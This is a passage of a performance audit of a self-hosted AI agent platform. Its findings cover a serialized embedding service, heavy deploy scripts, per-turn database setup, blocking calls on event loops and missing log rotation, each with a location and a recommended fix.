The box is a single 8 vCPU / 16 GB Hetzner host that also runs an unrelated Qoder daemon fleet (PRODUCTION.md §7.8). Background work is mostly throttled well: the batch timers use Nice and the idle IO class, hermes-embed has thread, CPU and memory caps, and the deploy only rebuilds frontends when their sources changed. The biggest performance risks are in how the shared embedding service is used. It runs one forward pass at a time behind a single global lock, and its callers make blocking urllib calls straight from async gateway/agent-home code paths, one request per chunk. So live recall can block the event loop for up to the 20 s client timeout while it waits behind ingestion. The deploy script also does far more than it needs to on a box that is serving live traffic: it restarts every service even when nothing changed, runs `npm ci` on the whole workspace (Electron included) up to twice, and chowns the entire tree. Other gaps: the nightly projection job loads the whole vector corpus as Python lists with no memory cap, timer schedules have drifted (the PCA fit now runs during Hong Kong working hours), and nothing in the repo rotates the append-mode /var/log files.

**Strengths:** hermes-embed is well bounded: MAX_BATCH=64, an 8192-char cap per text, OMP/MKL capped at 3 threads, CPUQuota=300%, MemoryMax=3G, CPUWeight=50, Nice=10, and loopback-only with pinned weights (deploy/hermes-embed.service:28-53, scripts/embedding_server.py:56-60).; The batch timers (rag-ingest, memory-projection, review-pass) use Nice=10-15, IOSchedulingClass=idle and a low CPUWeight, plus RandomizedDelaySec, so they don't start in lockstep after a restart.; RAG ingest is bounded per run (`--limit 100`, newest first) and skips unchanged documents by content hash (rag.py:366-378).; Re-embedding computes all vectors before opening the write transaction, so no write transaction stays open across minutes of CPU (store.py:610-646).; The deploy rebuilds the dashboard and agent-home only when their sources moved, and runs npm under nice -n 15 (hermes-deploy.sh:119-147).; The SSE routes send `cache-control: no-cache, no-transform` and `x-accel-buffering: no` (agent-home chat/stream route.ts:143, projects events/stream route.ts:35), and PRODUCTION.md documents the Caddy encode/SSE trap.; The system prompt is persisted per session (hermes_state.py:737, 1879 COALESCE), so a service restart does not rebuild or invalidate the cached conversation prefix.; The gateway housekeeping loop sweeps the image/document caches hourly with a 24 h TTL (gateway/run.py:19271-19283).; CI cancels superseded PR runs, caches the uv wheel cache with `uv cache prune --ci`, slices tests using duration data, and pins every action by SHA.

### infra-supply-chain-1. Shared embed service is fully serialized and is called with blocking urllib from async request paths, so live recall waits behind ingestion and stalls the event loop — Medium

- **Location:** `scripts/embedding_server.py:108-116, scripts/embedding_server.py:264, plugins/memory/supabase_pgvector/embedding.py:168, plugins/memory/supabase_pgvector/embedding.py:208, plugins/memory/supabase_pgvector/store.py:701, plugins/memory/supabase_pgvector/store.py:879, plugins/memory/supabase_pgvector/rag.py:381, plugins/memory/supabase_pgvector/rag.py:481`
- **Effort / confidence:** M / high
- **Description:** `ModelHolder.embed` holds a single `threading.Lock` around every `encode()`. `ThreadingHTTPServer` gives each request an unbounded thread, and all of those threads queue on that lock in arbitrary order. Interactive callers (`MemoryStore.query`, `MemoryStore.write`, `RagStore.search`) are `async def`, yet they call the synchronous `LocalHttpEmbedder.embed()`, which is `urllib.request.urlopen(timeout=20)`, with no `to_thread` or executor (grep finds none in the plugin). Ingestion runs at roughly 300 ms per chunk (docs/deployment/rag-ingestion.md:113). While an ingest pass, a reembed, or a 64-text batch holds the lock, a user's recall query waits seconds. During that wait the whole asyncio loop of the calling process (gateway / dashboard API) is blocked, freezing every other conversation and SSE stream it serves. If the 20 s client timeout fires, the server still finishes the abandoned work, wasting CPU.
- **Recommendation:** Wrap embedder calls in async code with `await asyncio.to_thread(...)`, or use an async HTTP client (httpx.AsyncClient) with a short timeout for queries. In the server, give interactive traffic priority: either a separate small-batch, query-priority lane (two locks or a priority queue keyed on a `priority` field or `len(texts)==1`), or have ingestion send small batches and yield between them. Bound the pending-request count and return 503 quickly when it is exceeded instead of piling up threads.

### infra-supply-chain-2. RAG ingestion embeds one chunk per HTTP request, so the service's batching is never used — Medium

- **Location:** `plugins/memory/supabase_pgvector/rag.py:380-382, deploy/hermes-embed.service:28, scripts/embedding_server.py:263`
- **Effort / confidence:** S / high
- **Description:** `RagStore.ingest` builds `vectors = [self._memory.embedder.embed(chunk.text) for chunk in chunks]`. Each `embed()` is a separate POST carrying a single text. That costs one JSON round trip, one lock acquisition and one forward pass with batch size 1 per chunk, even though `LocalHttpEmbedder.embed_batch` exists and the server is configured with `--batch-size 16`. Batched CPU inference with padding-sorted batches is usually several times faster per text than batch=1. The nightly `--limit 100` pass, and especially a backfill (which the docs describe as hours of embedding), therefore takes far longer and holds the lock for longer total time. That widens the head-of-line window described in the previous finding. The loop is also synchronous inside `async def ingest`.
- **Recommendation:** Replace the list comprehension with `embed_batch` over groups of about 16 chunks, run via `asyncio.to_thread`. Keep each group small, rather than one 64-text request, so interactive queries can interleave between groups.

### infra-supply-chain-3. Deploy restarts every service (gateway, WhatsApp bridges, pollers, app-mcp) even when the revision did not change — Medium

- **Location:** `deploy/hermes-deploy.sh:107-112, deploy/hermes-deploy.sh:154-162`
- **Effort / confidence:** S / high
- **Description:** When `BEFORE == AFTER` the script only prints "(already up to date)". It still runs `pip install -e .`, `systemctl daemon-reload`, and `systemctl restart` for every enabled hermes-* unit plus app-mcp, then sleeps a fixed 15 s. Every no-op deploy (re-runs, retries after a transient failure, "is it current?" checks) therefore drops in-flight gateway turns and the in-memory `_agent_cache` (gateway/run.py:2770). It also forces both WhatsApp bridges to reconnect their sessions, and restarts the pollers, which then re-do their startup fetches. All 15 units restart at once rather than staggered, which spikes CPU/IO on a shared box. PRODUCTION.md §5.1 even tells operators to check that no conversation is mid-turn, which shows the cost is real.
- **Recommendation:** Exit early after the fetch when `BEFORE == AFTER` and the bundles exist, unless `--force` is passed. When the revision did change, restart only the units affected: for example, skip the WhatsApp bridges unless `scripts/whatsapp-bridge/` changed, and skip pollers unless `custom/` or shared Python changed. Replace `sleep 15` with polling `systemctl is-active` and a timeout.

### infra-supply-chain-4. Deploy runs a full-workspace `npm ci` (including Electron and the desktop toolchain) on the production box, up to twice per deploy, while services are running — Medium

- **Location:** `deploy/hermes-deploy.sh:119-147, package.json:6-12, package-lock.json:271-276`
- **Effort / confidence:** S / high
- **Description:** The root package.json declares the workspaces `agent-home`, `apps/*`, `ui-tui`, `ui-tui/packages/*` and `web`. `npm ci` deletes node_modules and installs every workspace, which includes `apps/desktop` with `electron@40.10.2` (`hasInstallScript: true`, which downloads and extracts the Electron binary) and electron-builder, plus ui-tui. Production needs only `web` and `agent-home`. When both web/ and agent-home/ changed, the dashboard block (line 122) and the agent-home block (line 139) each run `npm ci` in turn, deleting and reinstalling the whole tree twice. This is minutes of CPU, disk and network on the serving box. While it runs, the live agent-home `next start` process has its node_modules deleted underneath it, even though agent-home is restarted only at line 159. Separately, the agent-home trigger regex `^(agent-home/|package-lock\.json$)` rebuilds even for test, README or docs-only changes under agent-home/.
- **Recommendation:** Run the install once at the top of the build section, and only if a rebuild is needed: `ELECTRON_SKIP_BINARY_DOWNLOAD=1 npm ci --workspace web --workspace agent-home --include-workspace-root --no-audit --no-fund`. Narrow the agent-home trigger to `agent-home/(src|public)/`, its config files, and `apps/shared/`. Better still, build in a staging directory (or `next build` with `distDir` into a fresh folder) and swap atomically, so the running server never sees a half-installed tree.

### infra-supply-chain-5. Nightly memory-projection fit materializes the entire vector corpus as Python float lists (float64) before sampling, with no memory cap on the unit — Medium

- **Location:** `hermes_cli/memory_projection.py:78-96, hermes_cli/memory_projection.py:156-164, deploy/hermes-memory-projection.service:24-48`
- **Effort / confidence:** M / medium
- **Description:** `fit_projection` fetches every row of `memories` and every row of `rag_chunks`, with full 1024-d embeddings, into asyncpg Records. It then builds `np.array([list(row['embedding']) for row in rows], dtype=np.float64)`. Each row passes through a Python list of 1024 float objects (roughly 32 KB of transient objects) before becoming an 8 KB float64 row, and memories and chunks are then copied again by `np.vstack`. `sample_size=20000` applies only to the SVD, after everything is already in memory. The RAG backfill keeps adding chunks every night: about 100k rows would mean several GB of peak RSS for a 2-D map. The unit has Nice and the idle IO class but no `MemoryMax`/`MemoryHigh`, on a box where PRODUCTION.md §7.8 documents swap at 100%. A spike here pushes the gateway, Postgres and the embed service into swap.
- **Recommendation:** Sample server-side for the fit (`TABLESAMPLE SYSTEM` or `ORDER BY random() LIMIT $n`) and use float32. Then stream the projection over a cursor in batches: fetch, transform with `vt[:2]`, then `executemany`. Decode vectors with a binary pgvector codec (`pgvector.asyncpg.register_vector` gives numpy arrays) instead of `list()`. Add `MemoryHigh=1G` / `MemoryMax=2G` to the unit.

### infra-supply-chain-6. Timer schedules have drifted from their stated intent: the whole-corpus PCA now runs during the owner's working hours, about 15 h before ingestion — Low

- **Location:** `deploy/hermes-memory-projection.timer:1-2, deploy/hermes-memory-projection.timer:8, deploy/hermes-rag-ingest.timer:1-3, deploy/hermes-rag-ingest.timer:9, deploy/hermes-memory-projection.service:33-34, deploy/hermes-embed.service:29-31`
- **Effort / confidence:** S / high
- **Description:** The projection timer comment says it runs "before the Drive ingestion pass at 03:20". Ingestion was moved to 18:20 UTC (02:20 HKT) because 03:20 UTC is late morning in Hong Kong. The projection is still at 03:00 UTC = 11:00 HKT, so the CPU-bound fit lands in the owner's active hours and contends with live chat. It also renders the map before that night's chunks arrive, so the map is a day stale. The unit comments also assume "4 vCPUs", but the box is 8 vCPU, so the CPU budgets (OMP=3, CPUQuota=300%) were sized for different hardware.
- **Recommendation:** Move the projection to about 19:30 UTC, after ingestion. Re-derive the embed CPU caps for 8 vCPUs (for example OMP_NUM_THREADS=4) and update the comments, so future tuning starts from the correct hardware facts.

### infra-supply-chain-7. Service logs are append-mode files under /var/log with no rotation shipped in the repo; the WhatsApp bridges log a JSON line per message — Low

- **Location:** `deploy/hermes-calendar-poller.service:23-24, deploy/hermes-calendar-triage.service:21-22, deploy/hermes-seminar-outreach.service:21-22, deploy/wa-bridge-add.sh:56-57, scripts/whatsapp-bridge/bridge.js:341, scripts/whatsapp-bridge/bridge.js:524, scripts/whatsapp-bridge/bridge.js:533`
- **Effort / confidence:** S / medium
- **Description:** These units use `StandardOutput=append:/var/log/hermes-*.log`, which bypasses journald's size limits. No logrotate config, `SystemMaxUse`, or rotation step exists anywhere in deploy/, docs/deployment/, or the provisioning script (grep finds none), and PRODUCTION.md §4.3 lists the files without mentioning rotation. The bridges emit structured JSON for every inbound and ignored event, and `Restart=always` with `RestartSec=5` loops can emit tracebacks every 5 s. The files grow without bound on the shared 160 GB disk that also holds Postgres. Disk exhaustion would take down Supabase. Confidence is medium because a hand-made logrotate config may exist on the box.
- **Recommendation:** Ship `deploy/logrotate-hermes` (`/var/log/hermes-*.log { daily rotate 14 compress copytruncate missingok }`) and install it from the deploy script. Alternatively, switch the units to `StandardOutput=journal` and set `SystemMaxUse=` in journald.conf.

### infra-supply-chain-8. Resource controls exist only on the batch jobs: user-facing services get no CPU or memory priority over a co-tenant fleet — Low

- **Location:** `agent-home/deploy/agent-home.service:33-54, agent-home/deploy/start.sh:21, deploy/hermes-calendar-poller.service:9-24, deploy/hermes-seminar-outreach.service:10-22, deploy/wa-bridge-add.sh:47-57`
- **Effort / confidence:** S / medium
- **Description:** Only hermes-embed has MemoryMax/CPUQuota, and only the oneshot jobs lower their own weight. The long-running pollers, the bridges and agent-home run with the default CPUWeight=100 and no MemoryHigh. The documented co-tenant Qoder fleet uses about 5 GB and drives swap to 100%, so latency-critical services (gateway, agent-home, dashboard) have no protection. agent-home is also started through `npm run start`, which keeps an extra resident npm process (tens of MB) in front of `next start` and adds a layer of signal forwarding.
- **Recommendation:** Give user-facing units `CPUWeight=200` and `MemoryLow=` reservations, and give pollers and bridges `MemoryHigh=` limits. Launch agent-home with `exec node node_modules/next/dist/bin/next start -H 127.0.0.1 -p $PORT` (or `next start` directly) instead of `npm run start`. Consider putting the Qoder units in a capped slice (`Slice=` with `MemoryMax`/`CPUQuota`).

### infra-supply-chain-9. Every deploy chowns the whole checkout, including node_modules, one file at a time — Low

- **Location:** `deploy/hermes-deploy.sh:151-152`
- **Effort / confidence:** S / high
- **Description:** `find "$REPO" -path "$REPO/.venv" -prune -o -print0 | xargs -0 chown hermes:hermes` visits every file in the checkout, including the hoisted node_modules from about 1,544 lockfile packages and the `.next` and `web_dist` build trees. That is hundreds of thousands of chown syscalls and inode ctime writes on every deploy, including no-op deploys. `chown -R root:root .venv` then does the same for the venv. The cost is seconds of IO each time, plus invalidation of tooling that watches ctime.
- **Recommendation:** Only touch files whose owner is wrong: `find "$REPO" -path "$REPO/.venv" -prune -o ! -user hermes -print0 | xargs -0r chown hermes:hermes`. Do the same for .venv with `! -user root`.

### infra-supply-chain-10. Deploy runs `pip install -e .` against loose pyproject ranges on every run instead of using the lockfile — Low

- **Location:** `deploy/hermes-deploy.sh:111-112, docs/deployment/PRODUCTION.md:157-162`
- **Effort / confidence:** S / medium
- **Description:** Every deploy, including no-op ones, runs `./.venv/bin/pip install -q -e .`. That means a PyPI network resolution of the full dependency set against the version ranges in pyproject.toml, plus an editable-wheel build, before anything restarts. This makes deploys slower, and when a dependency upgrades silently in the middle of a deploy, cold-start time and memory can change. uv.lock exists, and PRODUCTION.md §5.4 calls the box "uv-managed".
- **Recommendation:** Use `uv sync --frozen --extra <prod extras>` (or `uv pip install --no-deps -e .`, with deps installed from the lock only when uv.lock/pyproject.toml changed between BEFORE and AFTER). Skip the step entirely when the revision did not change.

### infra-supply-chain-11. Embedding vectors are converted float by float in Python on both sides of the wire and sent as text JSON — Low

- **Location:** `scripts/embedding_server.py:116, scripts/embedding_server.py:130, plugins/memory/supabase_pgvector/embedding.py:240`
- **Effort / confidence:** S / high
- **Description:** The server turns each numpy result into Python floats with a nested comprehension, then `json.dumps` writes about 18-20 characters per float: a 64x1024 response is about 1.3 MB of JSON and 65k Python float objects. The client then re-floats every component again. This runs while the global model lock has already been released, but it is CPU on the request thread and the GIL, on every embed call (including per-turn memory writes and queries).
- **Recommendation:** Use `vectors.astype('float32').tolist()` on the server (C-speed) and skip the per-component `float()` on the client after the length check. Optionally offer a compact binary format (base64 float32) for batch callers.

### infra-supply-chain-12. The checked-in agent-home Caddy snippet has drifted from production (no SSE handle block, stale IP) — Low

- **Location:** `agent-home/deploy/Caddyfile.agent-home:7, agent-home/deploy/Caddyfile.agent-home:26-37, docs/deployment/PRODUCTION.md:83-91`
- **Effort / confidence:** S / low
- **Description:** PRODUCTION.md says the live Caddyfile routes the SSE paths through a separate `handle` block with no `encode` and `flush_interval -1`, because gzip otherwise held stream frames until the end of the answer. The repo copy, which DEPLOY.md tells operators to append, applies `encode zstd gzip` to everything with no SSE matcher, and still names the decommissioned Alibaba IP 47.83.199.25. Rebuilding the box from the repo could bring back the "frozen until the answer lands" streaming regression. The PRODUCTION.md matcher list also omits the newer project SSE routes (`/api/projects/*/events/stream`, `cards/*/stream`, `runs/*/stream`). Impact is mitigated because these routes all send `Cache-Control: no-transform`, which Caddy's encoder should honour. Confidence is low because the live Caddyfile could not be inspected and that encoder behaviour is from memory.
- **Recommendation:** Commit the real production Caddyfile, with secrets and hostnames parameterized, including the `@sse` matcher covering `/api/chat/*` and `/api/projects/*/stream*`. Have the deploy script or the drift check diff it against /etc/caddy/Caddyfile, as it already does for the hermes-* units.

## mcp-acp

The biggest costs in mcp-acp are work that grows with total stored history or with the number of database calls, not with the size of the request. The main ones: (1) `mcp_serve.py`'s EventBridge loads every message of every session whenever the session index or the DB changes. (2) The MCP read tools load whole transcripts before applying their limits. (3) Each goal tool call reruns schema setup and row-level-security (RLS) DDL, which takes locks on Supabase tables, over new asyncpg connections. A shared pool is never used. (4) Some synchronous MCP tools, such as the `events_wait` long-poll, likely block the stdio server's event loop. In app-mcp, every guarded `app_act` call adds a full DOM-snapshot round trip. ACP streaming threads block on each update, and history replay sends updates one at a time. The ACP prompt-cache concern is smaller than it first looked: the in-memory cache is invalidated, but the stored system prompt is restored from the session DB on the next turn. ACP and `mcp_serve` usually run where the MCP/ACP client runs, so their impact on the Hetzner box depends on deployment. app-mcp and the Supabase paths do affect production directly.

**Strengths:** Folder search limits recursion with MAX_DEPTH and MAX_VISITED, and stops once it reaches the requested match count.; `messages_read`, `events_poll` and `events_wait` clamp the limits and timeouts callers pass in.; ACP agent turns run in a ThreadPoolExecutor, off the asyncio loop.; The Folder Bridge hub uses a silence deadline driven by progress pings, so long imports don't hit a fixed total cap; `read_file` has a byte cap.; SQLite has a `messages(session_id, timestamp)` index; `verify_schema_owner` caches verified schemas per process.; The conversation loop restores the persisted system prompt from the session DB so prefix caching survives a fresh or invalidated agent, and logs at WARNING when it falls back to a rebuild.

### mcp-acp-1. EventBridge loads every session's full transcript after any change — High

- **Location:** `mcp_serve.py:478-527, mcp_serve.py:430-439`
- **Effort / confidence:** M / high
- **Description:** When the sessions.json index or the DB changes, `_poll_once` walks every session entry and calls `db.get_messages(session_id)` with no limit. It then rescans all returned rows to find timestamps newer than that session's last-seen value. One new message therefore costs work proportional to all stored messages across all sessions. On the first poll, `_last_poll_timestamps` is empty, so the whole history is enqueued; the list is trimmed with `pop(0)`, which is O(QUEUE_LIMIT) per event while holding the lock.
- **Recommendation:** Track a per-session cursor on the monotonic message id and query `WHERE session_id=? AND id>? ORDER BY id LIMIT n`, only for sessions whose `updated_at` changed. Seed the cursors at startup with `MAX(id)` instead of replaying history. Replace the list with `collections.deque(maxlen=QUEUE_LIMIT)`.

### mcp-acp-2. Goal MCP tools rerun schema and RLS DDL on every call — High

- **Location:** `mcp_serve.py:1159-1163, mcp_serve.py:1265-1268, hermes_cli/goal_management.py:153-168, hermes_cli/access.py:655-660`
- **Effort / confidence:** M / high
- **Description:** `goal_manage` and `goal_context` build a new `GoalManagementService` and await `service.initialize()` on every call. That opens a connection and runs `CREATE SCHEMA IF NOT EXISTS`, the goals/memory/tasks/tools `initialize()` methods, `_SCHEMA_SQL`, and `apply_scope_rls`. `apply_scope_rls` runs `ALTER TABLE ... ENABLE/FORCE ROW LEVEL SECURITY` and `DROP POLICY` / `CREATE POLICY`, which take ACCESS EXCLUSIVE table locks. It then opens a second connection for the audit store. Each read-only goal lookup thus adds several round trips and briefly blocks concurrent readers and writers of the shared Supabase tables used by the gateway and web app.
- **Recommendation:** Cache one initialized service per (dsn, schema, mode) at module level, with initialization done once under an asyncio lock. Move DDL and RLS installation to migrations or startup, and have `apply_scope_rls` skip work when the policy already exists with the same definition.

### mcp-acp-3. MCP history tools load full transcripts before applying limits — High

- **Location:** `mcp_serve.py:650-681, mcp_serve.py:704-727`
- **Effort / confidence:** M / high
- **Description:** `messages_read` calls `get_messages(session_id)` with no limit, then filters, truncates content and slices `filtered[-limit:]`. `attachments_fetch` also loads the whole session to find a single message. For long conversations this deserializes every message and tool-call payload, uses memory proportional to the history, and holds SQLite reads open just to return a few rows.
- **Recommendation:** Add SessionDB methods for a recent window (`ORDER BY id DESC LIMIT ?` with a cursor) and for a single message by `(session_id, message_id)`. Return pagination cursors instead of whole transcripts.

### mcp-acp-4. Supabase-backed MCP calls open new asyncpg connections without a pool — Medium

- **Location:** `hermes_cli/datastore.py:93-111, mcp_serve.py:188-204, hermes_cli/access.py:1590-1591, plugins/memory/supabase_pgvector/store.py:436-441`
- **Effort / confidence:** L / high
- **Description:** `SupabaseAppStore.connect` calls `asyncpg.connect` directly. Each `goal_manage`, `goal_context` or `memory_search` call resolves the principal (`resolve_by_channel` opens its own connection) and then opens more for the store or service. That means a TLS handshake and pooler slot per operation, multiplied by concurrent MCP clients, which can push against the Supabase pooler's connection budget on the shared project.
- **Recommendation:** Create one bounded `asyncpg.create_pool` per (dsn, schema, mode) per process and acquire/release around operations. Cache the principal resolution for the static `MCP_PRINCIPAL_ENV` token for a short TTL.

### mcp-acp-5. Synchronous `events_wait` long-poll likely blocks the MCP server's event loop — Medium

- **Location:** `mcp_serve.py:864-891, mcp_serve.py:1303-1310`
- **Effort / confidence:** S / medium
- **Description:** `events_wait` is a synchronous `def` tool that calls `bridge.wait_for_event` for up to 300 s, while the server runs under `asyncio.run(server.run_stdio_async())`. FastMCP awaits async tools but appears to call sync tool functions inline (I didn't confirm this against the installed SDK version), so the event loop would stall for the whole wait. During that time no other tool requests on the same MCP connection, including async Supabase tools, would be served. The same applies, for shorter periods, to the synchronous full-history reads above.
- **Recommendation:** Make `events_wait` async and wait with `await asyncio.to_thread(bridge.wait_for_event, ...)`, or use an asyncio.Condition-based bridge. Wrap blocking SQLite reads in `asyncio.to_thread`.

### mcp-acp-6. Each guarded `app_act` call does an extra full-page snapshot round trip — Medium

- **Location:** `app-mcp/app_mcp/server.py:121-130, app-mcp/app_mcp/server.py:167-180`
- **Effort / confidence:** M / high
- **Description:** `_run_action` calls `_element_name()` to check whether the target looks destructive. When the target is given by element id, that sends a full `{type: 'snapshot'}` command over the browser WebSocket and waits for the whole DOM description before sending the actual command. Every element-id click, type or select therefore costs two browser round trips plus a full snapshot serialization, roughly doubling action latency and payload during agent-driven UI sessions.
- **Recommendation:** Have the browser include the element's accessible name in the action result (and refuse destructive targets on the client), or cache the last snapshot's id-to-name map from `app_describe_page` and keyed by page path and state version. Only re-snapshot when the cache is missing or stale.

### mcp-acp-7. ACP streaming callbacks block the agent thread on every update — Medium

- **Location:** `acp_adapter/events.py:87-107`
- **Effort / confidence:** S / high
- **Description:** `_send_update` schedules `conn.session_update` on the loop and then waits on `future.result(timeout=5)` from the agent worker thread. Streamed text, thought and tool-progress callbacks therefore wait for each JSON-RPC write to the editor in turn. A slow or backpressured client makes model streaming and tool execution wait up to 5 s per update, which ties up one of the four shared executor workers.
- **Recommendation:** Make updates truly fire-and-forget: schedule the coroutine and attach a done-callback that logs errors. Use an ordered per-session queue drained by an asyncio task, and coalesce adjacent text deltas, instead of waiting on each future.

### mcp-acp-8. ACP history replay sends one awaited update per historical item — Medium

- **Location:** `acp_adapter/server.py:1023-1105, acp_adapter/server.py:1140-1176`
- **Effort / confidence:** M / high
- **Description:** `load_session` and `resume_session` await `_replay_session_history` inline, and it awaits one `session_update` for every user, assistant and thought message and every tool start/complete. Reconnect latency therefore grows linearly with transcript and tool-event count before the RPC returns.
- **Recommendation:** Coalesce adjacent message chunks and replay a bounded recent window, with an explicit way to fetch older history. Skip replaying redundant tool metadata.

### mcp-acp-9. One global four-thread executor runs all ACP agent turns — Medium

- **Location:** `acp_adapter/server.py:90`
- **Effort / confidence:** S / high
- **Description:** All ACP prompt turns share `ThreadPoolExecutor(max_workers=4)`. A fifth concurrent session waits silently in the executor queue, and latency jumps once concurrency goes past four. Blocking `_send_update` waits, above, use up the same slots.
- **Recommendation:** Make the worker count configurable, add explicit admission, backpressure and queue-depth logging, and fix the blocking update path so workers aren't idle while waiting on I/O.

### mcp-acp-10. Folder search reads metadata and snippets one match at a time — Medium

- **Location:** `agent-home/src/lib/folder-bridge/fsOps.ts:176-204`
- **Effort / confidence:** M / high
- **Description:** For each matching text file, the walk awaits `handle.getFile()` and then `readSnippet()` before moving on. Search latency grows linearly with the number of matches, and the hub's silence deadline keeps getting closer while this runs.
- **Recommendation:** Collect matches first, read snippets only for the first N results, and use a small concurrency limiter for those reads, or make snippets opt-in.

### mcp-acp-11. EventBridge reads and hashes sessions.json every 200 ms — Low

- **Location:** `mcp_serve.py:366-369, mcp_serve.py:453-462`
- **Effort / confidence:** S / high
- **Description:** Every poll reads all of sessions.json and computes a SHA-256 even when nothing changed, which means about five full reads plus hashes per second for the life of the process. The cost is small for small indexes but runs constantly and scales with index size.
- **Recommendation:** Use `(st_mtime_ns, st_size)` as the change check and hash only when the stat is ambiguous; cache the resolved path.

### mcp-acp-12. MCP read tools create a new SessionDB on every call — Low

- **Location:** `mcp_serve.py:75-79`
- **Effort / confidence:** S / medium
- **Description:** `_get_session_db()` builds a new `SessionDB()` for each `messages_read` or `attachments_fetch` call, paying connection setup and schema initialization each time, even though the EventBridge already holds one.
- **Recommendation:** Reuse one process-level SessionDB (it is already thread-safe under its lock) for the read tools.

### mcp-acp-13. ACP MCP registration rebuilds the tool surface even when nothing changed — Low

- **Location:** `acp_adapter/server.py:818-853, agent/conversation_loop.py:281-340`
- **Effort / confidence:** S / medium
- **Description:** When `mcp_servers` is supplied, every new, load and resume call re-resolves toolsets, rebuilds tool definitions and calls `_invalidate_system_prompt()`. This is not a prefix-cache break: on the next turn, `_restore_or_build_system_prompt` reuses the stored prompt when it matches the runtime. The cost is repeated CPU work, plus a cache miss whenever the rebuilt tool list differs in content or order.
- **Recommendation:** Fingerprint the requested server configs and the resulting tool names, and skip the refresh and invalidation when the fingerprint hasn't changed. Keep tool ordering deterministic.

### mcp-acp-14. Superseded app WebSocket connections aren't closed by the hub — Low

- **Location:** `app-mcp/app_mcp/hub.py:49-53`
- **Effort / confidence:** S / medium
- **Description:** `Hub.attach` fails the old connection's pending commands when a newer one takes over, but never closes the old socket. It stays open, keeping its handler task and buffers alive and still sending state pings, until the browser tab closes it. Reloads and multiple tabs build up idle connections.
- **Recommendation:** Close the superseded connection, for example `asyncio.create_task(old.close(code=4000, reason='superseded'))`, inside `attach`.

## plugins-cron

Performance in this area is mostly limited by setup work and database connections that get repeated on hot paths. It is not limited by algorithmic cost. The biggest cost is that agent-home builds a fresh AIAgent for every chat turn. Because of that, the Supabase pgvector memory provider redoes its connection and schema DDL setup on every turn. On top of that, every turn also runs a recall query and a task-discovery write plus a top-100 vector query, and each of those spins up its own thread, event loop and asyncpg connection. In the dashboard process, kanban runs init_db() on every request and polls SQLite every 300 ms for each WebSocket client. The achievements /rescan endpoint runs a scan that can take minutes directly on the shared web_server event loop. Cron is fine at today's job counts but rewrites and fsyncs jobs.json once per due job and runs with unbounded parallelism by default.

**Strengths:** Cron keeps a persistent worker pool and an in-flight guard per job ID, so overlapping ticks never run the same job twice.; Cron output retention is bounded (output_retention default 50) and jobs.json writes are atomic (write a temp file, fsync, then replace).; Kanban WebSocket polling is run off the event loop with asyncio.to_thread, and the frontend debounces board reloads (scheduleReload, 250 ms).; Memory recall is added as an ephemeral turn context instead of changing the system prompt, so the per-conversation prompt cache keeps working.; Achievements serves a cached or persisted snapshot on non-forced requests, runs cold scans in a background thread, and reuses per-session checkpoints.; Security-guidance regexes are compiled once at module level, and the size of scanned payloads is capped.

### plugins-cron-1. A fresh AIAgent per agent-home turn re-runs Supabase memory provider initialization (new connection plus schema DDL) on every message — High

- **Location:** `gateway/session_chat.py:73-92,123-134; agent/agent_init.py:1336-1397; plugins/memory/supabase_pgvector/__init__.py:338; plugins/memory/supabase_pgvector/store.py:391-435,449`
- **Effort / confidence:** M / high
- **Description:** run_session_turn_sync() calls build_session_agent() on every turn, and that returns a brand-new AIAgent(...) with no cache. AIAgent init loads the configured memory provider and calls MemoryManager.initialize_all(), which in turn calls SupabasePgvectorMemoryProvider.initialize(). Through store.initialize() and _prepare_connection(), that opens a new asyncpg connection and runs CREATE SCHEMA IF NOT EXISTS, CREATE EXTENSION IF NOT EXISTS vector, vector-schema discovery, a search_path change and set_type_codec() (which triggers asyncpg type introspection). So every user message to agent-home, the primary UI, pays for a TCP/TLS/SCRAM handshake plus several catalog round trips before the model call starts. Under concurrent users this also takes Supabase pooler slots and catalog locks. The session-turn-timing log line (build_agent_ms) will capture this cost.
- **Recommendation:** Separate one-time schema setup from per-agent initialization. Run the DDL once per process (keep a module-level 'schema verified' flag per DSN and schema), or move it into an explicit migration step. Then have initialize() only bind session state and borrow from a shared asyncpg pool. A longer-term option is to cache the provider or the agent per session.

### plugins-cron-2. Memory recall creates a thread, an event loop and a new asyncpg connection on every eligible turn — High

- **Location:** `plugins/memory/supabase_pgvector/__init__.py:416,591-613; plugins/memory/supabase_pgvector/store.py:435; hermes_cli/datastore.py:106-110`
- **Effort / confidence:** L / high
- **Description:** prefetch() runs a remote vector search for every user message that meets the minimum length. _run_async() starts a new threading.Thread that calls asyncio.run(coro) and then joins it, so each call builds and tears down a full event loop. The store's _connect() calls asyncpg.connect() directly, with no pooling, and re-runs _prepare_connection(), so every recall also does a full connection handshake and codec setup. All of this runs synchronously before the model call, which adds latency to each turn and causes connection churn against the Supabase pooler.
- **Recommendation:** Keep one long-lived background event loop thread per process, submitting work with asyncio.run_coroutine_threadsafe, plus one bounded asyncpg.create_pool(init=...) per DSN/profile. Reuse both for recall, writes, task discovery and RAG.

### plugins-cron-3. Task discovery runs an embedding, a memory write and a top-100 vector query on every user turn — High

- **Location:** `plugins/memory/supabase_pgvector/__init__.py:379; hermes_cli/task_registry.py:323-344; plugins/memory/supabase_pgvector/store.py:701,879`
- **Effort / confidence:** M / high
- **Description:** on_turn_start() calls observe_prompt() for every non-empty user message. LiveMemoryIntentSignals.record() writes an intent-signal memory item, which embeds the text and runs the duplicate check. It then calls query() with top_k=100, which embeds the same text a second time, and counts rows where row.text == normalized_intent on the Python side. Every turn therefore pays for two embeddings, a write, an ANN query of up to 100 rows, and two separate connection/thread setups, in addition to the recall in prefetch(). The intent-signal rows also grow without limit as conversation volume grows. Using exact text matching on top of approximate vector search also makes the count depend on HNSW recall.
- **Recommendation:** Replace this with a counter table keyed by (principal, normalized_intent) and updated with a single INSERT ... ON CONFLICT DO UPDATE SET count = count + 1 RETURNING count. Skip it for messages that are trivially short or repeated, and drop the vector query from the threshold check.

### plugins-cron-4. Achievements /rescan runs a synchronous full scan inside an async handler, blocking the shared dashboard/agent-home event loop — High

- **Location:** `plugins/hermes-achievements/dashboard/plugin_api.py:977-980,1037-1039,955-960; hermes_cli/web_server.py:561-590`
- **Effort / confidence:** S / high
- **Description:** rescan is an 'async def' that calls evaluate_all(force=True), and that calls _run_scan_and_update_cache() inline. The code's own docstring says cold scans on 8000+ session databases take minutes. Plugin routers are mounted into the same web_server FastAPI app that serves /api/sessions/{id}/chat/stream. For the whole scan, the event loop cannot handle any request, SSE stream, approval callback or WebSocket. A single click on Rescan can therefore freeze agent-home for every user.
